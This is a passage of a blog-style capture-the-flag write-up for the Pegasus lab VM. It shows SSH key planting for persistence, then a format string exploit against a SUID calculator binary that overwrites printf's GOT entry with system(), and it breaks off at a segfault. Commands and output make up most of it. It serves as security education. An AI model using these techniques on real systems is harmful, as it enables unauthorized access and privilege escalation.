</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&quot;</span> &gt;&gt; authorized_keys
</span><span class='line'>ls -lh
</span><span class='line'>total 12K
</span><span class='line'>-rw-rw-r-- 1 mike mike  381 Dec 23 20:36 authorized_keys
</span><span class='line'>-rw------- 1 mike mike 1.7K Nov 18 12:39 id_rsa
</span><span class='line'>-rw-r--r-- 1 mike mike  222 Nov 18 17:39 known_hosts
</span><span class='line'>chmod 600 authorized_keys
</span><span class='line'>^C
</span><span class='line'>
</span><span class='line'><span class="c"># with the authorized_keys ready, I SSH in as mike using my key pair</span>
</span><span class='line'>root@kali:~# ssh mike@192.168.56.101 -i pegasus
</span><span class='line'>Welcome to Ubuntu 12.04.5 LTS <span class="o">(</span>GNU/Linux 3.13.0-39-generic i686<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Tue Dec 23 20:36:47 AEDT 2014
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:           93
</span><span class='line'>  Usage of /:   6.8% of 18.32GB   Users logged in:     0
</span><span class='line'>  Memory usage: 12%               IP address <span class="k">for </span>eth0: 192.168.56.101
</span><span class='line'>  Swap usage:   0%
</span><span class='line'>
</span><span class='line'>  <span class="o">=</span>&gt; There are 2 zombie processes.
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Your Hardware Enablement Stack <span class="o">(</span>HWE<span class="o">)</span> is supported <span class="k">until </span>April 2017.
</span><span class='line'>
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
</span><span class='line'>mike@pegasus:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>my_first, your_first, we_all_first</h2>

<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>ls -lh
</span><span class='line'>total 16K
</span><span class='line'>-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
</span><span class='line'>drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
</span><span class='line'>-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
</span></code></pre></td></tr></table></div></figure>


<p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>ls -lh /opt/
</span><span class='line'>total 12K
</span><span class='line'>drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
</span><span class='line'>drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
</span><span class='line'>drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
</span></code></pre></td></tr></table></div></figure>


<p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>

<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>

<h3>rebuilding main.c</h3>

<p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>

<p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:/opt/git/my_first.git<span class="nv">$ </span>git log
</span><span class='line'>commit 85365946a8142c52ee6040a029dd069b514c2ab0
</span><span class='line'>Author: Mike Ross &lt;mike@pegasus.<span class="o">(</span>none<span class="o">)</span>&gt;
</span><span class='line'>Date:   Tue Nov 25 04:48:01 2014 +1100
</span><span class='line'>
</span><span class='line'>    Committing some security fixes
</span><span class='line'>
</span><span class='line'>commit 0a8af1ed956518ec078b152ad7571105e2df26c6
</span><span class='line'>Author: John Wall &lt;john@pegasus.<span class="o">(</span>none<span class="o">)</span>&gt;
</span><span class='line'>Date:   Tue Nov 25 04:39:42 2014 +1100
</span><span class='line'>
</span><span class='line'>    initial commit
</span></code></pre></td></tr></table></div></figure>


<p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
</span><span class='line'>commit 0a8af1ed956518ec078b152ad7571105e2df26c6
</span><span class='line'>Author: John Wall &lt;john@pegasus.(none)&gt;
</span><span class='line'>Date:   Tue Nov 25 04:39:42 2014 +1100
</span><span class='line'>
</span><span class='line'>    initial commit
</span><span class='line'>
</span><span class='line'><span class="gh">diff --git a/main.c b/main.c</span>
</span><span class='line'>new file mode 100644
</span><span class='line'><span class="gh">index 0000000..39c0182</span>
</span><span class='line'><span class="gd">--- /dev/null</span>
</span><span class='line'><span class="gi">+++ b/main.c</span>
</span><span class='line'><span class="gu">@@ -0,0 +1,133 @@</span>
</span><span class='line'><span class="gi">+#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="gi">+#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="gi">+</span>
</span><span class='line'><span class="gi">+int calculator();</span>
</span><span class='line'><span class="gi">+int string_replay();</span>
</span><span class='line'><span class="gi">+int string_reverse();</span>
</span><span class='line'><span class="gi">+int quit();</span>
</span><span class='line'><span class="gi">+</span>
</span><span class='line'><span class="gi">+int main()</span>
</span><span class='line'><span class="gi">+{</span>
</span><span class='line'><span class="gi">+    char selection[5];</span>
</span><span class='line'><span class="gi">+    int sel;</span>
</span><span class='line'><span class="gi">+    char * err_check;</span>
</span><span class='line'>
</span><span class='line'>[... snip ...]
</span></code></pre></td></tr></table></div></figure>


<p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# patch -p1 &lt; init.diff
</span><span class='line'>patching file main.c
</span></code></pre></td></tr></table></div></figure>


<p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>

<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'><span class="gh">diff --git a/main.c b/main.c</span>
</span><span class='line'><span class="gh">index 39c0182..b6b2ed4 100644</span>
</span><span class='line'><span class="gd">--- a/main.c</span>
</span><span class='line'><span class="gi">+++ b/main.c</span>
</span><span class='line'><span class="gu">@@ -8,7 +8,7 @@ int quit();</span>
</span><span class='line'>
</span><span class='line'>[... snip ...]
</span><span class='line'><span class="gi">+        </span>
</span><span class='line'>         printf(&quot;Enter second number: &quot;);
</span><span class='line'>         if (fgets(numberB, sizeof numberB, stdin) != NULL)
</span><span class='line'>         {
</span><span class='line'><span class="gd">-            int numA = strtol(numberA, &amp;err_check, 10);</span>
</span><span class='line'>             int numB = strtol(numberB, &amp;err_check, 10);
</span><span class='line'>             if (*err_check != &#39;\n&#39;)
</span><span class='line'>             {
</span><span class='line'><span class="gd">-                printf(&quot;Error details: &quot;);</span>
</span><span class='line'><span class="gd">-                printf(err_check);</span>
</span><span class='line'><span class="gi">+                printf(&quot;Error details: %s&quot;, err_check);</span>
</span><span class='line'>                 printf(&quot;\n&quot;);
</span><span class='line'>                 return 1;
</span><span class='line'>[... snip ...]
</span></code></pre></td></tr></table></div></figure>


<p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>

<h3>the calculator with a hole</h3>

<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>

<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>

<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection: 1
</span><span class='line'>
</span><span class='line'>Enter first number: 1
</span><span class='line'>Enter second number: %x
</span><span class='line'>Error details: bf96cbec
</span><span class='line'>
</span><span class='line'>Selection:
</span></code></pre></td></tr></table></div></figure>


<p><img src="https://i.imgur.com/xrrpxFZ.png"></p>

<p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>

<p>Anyways, feels aside, it was time to work on a exploit.</p>

<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>

<p><strong>EDIT</strong> I have since made a small asciinema showing the offset calculations on my Kali VM. Though the offsets are not the same the theory still applies.</p>

<script type="text/javascript" src="https://asciinema.org/a/14960.js" id="asciicast-14960" async data-theme="solarized-dark"></script>


<h3>punching more than numbers</h3>

<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>

<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>

<h4>compiling the format string</h4>

<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\n1\n4\n&#39;</span> <span class="p">|</span> ./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Result: 1 + <span class="nv">1</span> <span class="o">=</span> 2
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Goodbye!
</span></code></pre></td></tr></table></div></figure>


<p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%&rsquo;) as it needs to be escaped in the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\nAAAA.0x%%x\n4\n&#39;</span> <span class="p">|</span> ./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Error details: AAAA.0xbff5321c
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Goodbye!
</span></code></pre></td></tr></table></div></figure>


<p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&#39;</span> <span class="p">|</span> ./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Goodbye!
</span><span class='line'>mike@pegasus:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\nAAAA.0x%%8$x\n4\n&#39;</span> <span class="p">|</span> ./my_first
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Error details: AAAA.0x41414141
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Goodbye!
</span><span class='line'>mike@pegasus:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>

<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>objdump -R ./my_first
</span><span class='line'>
</span><span class='line'>./my_first:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>08049bec R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>08049c20 R_386_COPY        stdin
</span><span class='line'>08049bfc R_386_JUMP_SLOT   <span class="nb">printf</span>
</span><span class='line'>08049c00 R_386_JUMP_SLOT   fgets
</span><span class='line'>08049c04 R_386_JUMP_SLOT   puts
</span><span class='line'>08049c08 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049c0c R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>08049c10 R_386_JUMP_SLOT   putchar
</span><span class='line'>08049c14 R_386_JUMP_SLOT   strtol
</span></code></pre></td></tr></table></div></figure>


<p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>

<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s
</span><span class='line'>8192
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s
</span><span class='line'>unlimited
</span></code></pre></td></tr></table></div></figure>


<p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># fire up gdb</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>gdb -q ./my_first
</span><span class='line'>Reading symbols from /home/mike/my_first...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'><span class="c"># set a break point as we enter main()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b main
</span><span class='line'>Breakpoint 1 at 0x804850f
</span><span class='line'>
</span><span class='line'><span class="c"># run the binary</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r
</span><span class='line'>Starting program: /home/mike/my_first
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x0804850f in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># leak the current address of system()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x40069060 &lt;system&gt;
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>

<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># so, instead of the 4 x A&#39;s, we will now place the address</span>
</span><span class='line'><span class="c"># in the GOT that we want to override, and use the %x format</span>
</span><span class='line'><span class="c"># string to attempt writing to it</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">printf</span> <span class="s1">&#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39;</span> &gt; t
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>file t
</span><span class='line'>t: data
</span><span class='line'>
</span><span class='line'><span class="c"># then, in gdb, we will grab the output of the new file called</span>
</span><span class='line'><span class="c"># t, and redirect it as input to my_first</span>
</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>gdb -q ./my_first
</span><span class='line'>Reading symbols from /home/mike/my_first...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'><span class="c"># leak the current address that GOT points to for printf()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x08049bfc
</span><span class='line'>0x8049bfc &lt;<span class="nb">printf</span>@got.plt&gt;: 0x080483b6
</span><span class='line'>
</span><span class='line'><span class="c"># run the binary with our exploit (t) as input</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r &lt; t
</span><span class='line'>Starting program: /home/mike/my_first &lt; t
</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
</span><span class='line'>--------------------------------
</span><span class='line'>Select your tool:
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
</span><span class='line'>
</span><span class='line'>Selection:
</span><span class='line'>Enter first number: Enter second number: Error details: ��
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x00000004 in ?? <span class="o">()</span>
